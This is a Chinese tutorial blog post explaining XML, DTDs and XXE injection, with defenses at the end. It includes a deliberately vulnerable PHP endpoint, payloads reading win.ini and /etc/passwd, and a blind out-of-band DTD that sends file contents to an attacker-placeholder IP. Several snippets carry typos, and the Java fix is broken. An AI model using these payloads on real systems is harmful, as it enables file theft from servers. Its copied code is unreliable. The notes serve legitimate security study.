---
layout:     post
title:      Web笔记（十三）XXE
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是XML文件和XXE漏洞攻击的笔记内容。
date:       2020-12-05
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - XXE
---



## 0x00 XXE注入漏洞简介

XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。

XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。因此我们有必要先学习XML文件。



## 0x01 XML

#### 1. XML介绍

XML被设计用来传输和存储数据。XML文档形成了一种树结构，它从“根部”开始，然后扩展到“枝叶”。XML允许创作者定义自己的标签和自己的文档结构。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Dont forget me this weekend!</body>
</note>
```

#### 2. XML语法

- 所有的XML元素都必须有一个关闭标签。
- XML标签对大小写敏感。
- XML必须正确嵌套。
- XML属性值必须加引号。
- 实体引用。（\&lt;为\<，\&gt;为\>）
- 在XML中，空格会被保留。

#### 3. XML元素

XML元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。每个元素又可以有对应的属性，并且属性必须加引号。

- XML文档必须有一个根元素。
- XML元素都必须有一个关闭标签。
- XML标签对大小写敏感。
- XML元素必须被正确的嵌套。
- XML属性值必须加引号。

#### 4. XML DTD介绍

拥有正确语法的XML被称为“形式良好”的XML。通过DTD验证的XML是“合法”的XML。
```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE note[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<message>Dont forget me this weekend!</message>
</note>
```

#### 5. DTD声明类型

- 内部的DOCTYPE声明：`<!DOCTYPE root-element [element-declarations]>`
```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE note[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<message>Dont forget me this weekend!</message>
</note>
```
- 外部文档声明

假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中：`<!DOCTYPE root-element SYSTEM "filename">`

而在XML文件中写入：
```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<message>Dont forget me this weekend!</message>
</note>
DTD文件note.dtd写入：
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

#### 6. DTD数据类型

- PCDATA的意思是被解析的字符数据（parsed character data）。

PCDATA是被解析器解析的文本。这些文本将被解析器检查实体以及标记。

- CDATA的意思是字符数据（character data）。

CDATA是不会被解析器解析的文本。在这些文本中的标签不会被当做标记来对待，其中的实体也不会被展开。

#### 7. DTD实体介绍

实体其实就是变量，是用于定义引用普通文本或特殊字符的快捷方式的变量。

- 内部实体：`<!ENTITY entity-name "entity-value">`
- 外部实体：`<!ENTITY entity-name SYSTEM "URI/URL">`



## 0x02 XXE漏洞构成

#### 1. file_get_contents()函数

file_get_contents()函数把整个文件读入一个字符串中。

file_get_contents(path, include_path, context, start, max_length)

- path    必需，规定要读取的文件
- include_path    可选，如果也想在include_path中搜寻文件的话，可以将该参数设为“1”
- context    可选，规定文件句柄的环境，context是一套可以修改流的行为的选项，若使用null，则忽略，该参数的支持是PHP5.0.0加的
- start    可选，规定在文件中开始读取的位置，该参数是PHP5.1新加的
- max_length    可选，规定读取的字节数，该参数是PHP5.1新加的

#### 2. php://input

php://input是个可以访问请求的原始数据的只读流。

结合file_get_contents("php://input")可以读取POST提交的数据。

#### 3. php中与XXE漏洞相关的函数和类

simplexml_load_string() — 将XML字符串解释为对象
simplexml_load_file() — 将XML文件解释为对象
simplexml_import_dom() — 从DOM节点获取SimpleXMLElement对象
Class SimpleXMLElement —— 构造函数返回表示数据的SimpleXMLElement对象
Class DOMDocument —— loadXML() 从字符串加载XML文档，返回True/False

#### 4. simplexml_load_string()函数

php中的simplexml_load_string函数将xml格式字符串转换为对应的SimpleXMLElement。

例如：(注意格式是\<\<\<XML XML;两个XML中间夹着XML内容)
```php
$note=<<<XML<note>   <to>Tove</to>  <from>Janni</from>  <heading>Reminder</heading>  <body>Dont forget me this weekend!</body></note>XML;
$xml = simplexml_load_string($note);
print_r($xml);
```



## 0x03 XML漏洞利用——有回显

在PHP中可以使用print_r()、echo输出想要输出的内容。
完整存在XXE漏洞代码如下：

```php
<?php
$xml = file_get_contents("php://input");
$data = simplexml_load_string($xml);
echo "<pre>";
print_r($data);    // 注释掉该语句即为无回显的情况
?>
```

以上代码需要POST请求，输入XML，这样就会被php://input接收到并被file_get_contents()函数转成字符串，然后由simplexml_load_string()函数转化成XML对象，print_r会输出对象全部信息，包括类信息。

POST请求数据部分修改XML内容如下：
```xml-dtd
<?xml version="1.0" encoding="urf-8"?>
<!DOCTYPE xxe [
<!EL    EMENT name ANY >
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>
<name>&xxe;</name>
</root>
```

利用file://协议获取服务器本地的文件，通过print_r()函数回显。

读取文件可以用：

- file:///path/to/file.txt
- http://url/file.txt
- php://filter/read=convert.base64-encode/resource=conf.php

base64编码读出来的文件内容需要解码，Kali终端输入以下命令可以base64解码：
```
echo "base字符串" | base64 -d
```



## 0x04 XXE漏洞利用——无回显

首先环境假设有客户端A(攻击者)、服务端B、攻击者搭建的服务端C、资源（可以是B的本地或内网）。

A向B发送POST请求，并提交XML内容
```xml
<?xml version="1.0"?>

<!DOCTYPE foo SYSTEM "http://C的ip地址/test.dtd">
<foo>&e1;</foo>
```

然后B会向C服务器请求（C需要提前起一个HTTP服务）
```
http://C的ip地址/test.dtd
```

就会将dtd加载到B的本地来执行。test.dtd的内容：
```xml-dtd
<!ENTITY % p1 SYSTEM "file:///etc/passwd">    # 获取本地文件给攻击者
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://A的ip地址/test.php?con=%p1;'>">
%p2;
```
接着A只需要wireshark抓包查看请求结果。



## 0x05 XXE漏洞危害

- 读取本地敏感文件内容
- 对内网信息进行探测
- 可能导致命令执行
- 向服务器发起DDoS攻击



## 0x06 XXE漏洞防御

#### 1. XXE漏洞消亡原因

libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。

#### 2. 防御措施

- 关闭外部实体引用功能（最简单直接，并且安全）

使用开发语言提供的禁用外部实体的方法：

PHP：
```php
libxml_disable_entity_loader(true);
```

JAVA：
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
df.setExpandEntityReferences(false);
```

Python：
```python
from lxml import etree
xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=False))
```

- 在服务器端进行白名单验证和过滤，如不能用白名单，可以用关键词过滤用户提交的XML数据

关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC。

- 及时修复或更新应用程序或底层操作系统使用的相关XML处理器和库

- 使用XSD验证等验证方法来验证上传的XML文件

